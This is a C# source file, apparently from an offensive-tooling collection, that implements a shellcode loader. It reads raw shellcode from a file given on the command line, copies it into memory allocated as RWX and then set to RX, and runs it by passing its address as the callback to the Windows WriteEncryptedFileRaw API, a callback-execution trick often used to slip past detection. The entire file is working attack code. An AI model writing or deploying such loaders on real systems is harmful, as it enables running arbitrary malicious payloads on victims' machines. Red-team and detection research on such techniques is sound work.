// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EncryptedFileRaw
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: EncryptedFileRaw.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/); 
            
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            
            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr pvContext = IntPtr.Zero;
            ulong CREATE_FOR_IMPORT = 1;
            OpenEncryptedFileRaw(System.IO.Path.GetTempFileName(), CREATE_FOR_IMPORT, out pvContext);
            WriteEncryptedFileRaw(hAlloc, IntPtr.Zero, pvContext);
        }

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Advapi32.dll")]
        static extern uint OpenEncryptedFileRaw(
            string lpFilename,
            ulong ulFlags,
            out IntPtr pvContext);

        [DllImport("Advapi32.dll")]
        static extern uint WriteEncryptedFileRaw(
            IntPtr pfImportCallback,
            IntPtr pvCallbackContext,
            IntPtr pvContext);
    }
}
